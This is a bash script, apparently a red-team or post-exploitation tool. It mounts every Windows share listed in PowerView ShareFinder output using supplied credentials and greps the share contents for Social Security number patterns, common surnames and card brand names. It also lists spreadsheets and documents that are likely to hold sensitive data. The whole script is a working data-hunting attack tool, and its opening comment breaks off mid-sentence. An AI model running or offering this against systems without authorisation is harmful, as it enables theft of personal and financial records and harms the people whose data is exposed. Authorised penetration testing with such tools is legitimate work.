#!/bin/bash
#####
## This script assumes the output from PowerView's Invoke-ShareFinder script (minus the extraneous pieces of information 
## such as share description).  The script requires  
cd ~
umount /mnt/targ 2>&1
mkdir -p /mnt/targ
mkdir -p ~/share-search/ 2>&1

read -p "Enter the username you want to use:  " -r user_name
read -p "Enter the password for that user:  " -r user_pass

cat <<-EOF > ~/.smbcredentials
username=${user_name}
password=${user_pass}
EOF

### requires a file with all the shares loaded into it
path="/root/sharelist.txt"
for z in $(cat $path);
do
    ### the structure of the 'grep' and 'sed' arguments only applies if the shares start with the windows share structure "\\"
    ### the windows share structure must be converted to linux share structure "//"
    pname=$( echo $z | grep '^\\.*$' | sed -e 's/\\/\//g' )
    if [ $pname ];
        then
        mount -t cifs -o credentials=~/.smbcredentials $pname /mnt/targ
        sleep 3
        cd /mnt/targ
        filename=$( echo $pname | sed -e 's/\///g' )
        ### matches context for SSN's ... TONS of false-positives
        echo "Processing share:  ${pname} ..."
        grep -R -InH '[0-9]\{3\}[-|\ ][0-9]\{2\}[-|\ ][0-9]\{4\}' >> ~/share-search/${filename}.ssn.txt &
        ### trying to make searching easier by using a few common last names... 
        ### ...figure if we find one, we'll know the file naming convention and can locate more.
        grep -E -Ri -InH 'martinez|jones|smith|williams|thomas|david|visa|mastercard' >> ~/share-search/${filename}.namesearch.txt &
        ### finding interesting file types... Ones that usually hold actionable information
        find . -regex ".*\.csv" >> ~/share-search/temp &
        find . -regex ".*\.rtf" >> ~/share-search/temp &
        find . -regex ".*\.xlsx" >> ~/share-search/temp &
        find . -regex ".*\.xls" >> ~/share-search/temp &
        find . -regex ".*\.docx" >> ~/share-search/temp &
        find . -regex ".*\.txt" >> ~/share-search/temp &
        wait
        cat ~/share-search/temp | sort | uniq > ~/share-search/${filename}.interestingfiles.txt
        rm ~/share-search/temp
        cd ~
        umount /mnt/targ
    fi
    ### unmounting the drive an extra time in the event the first attempt failed.
    umount /mnt/targ 2>&1
done
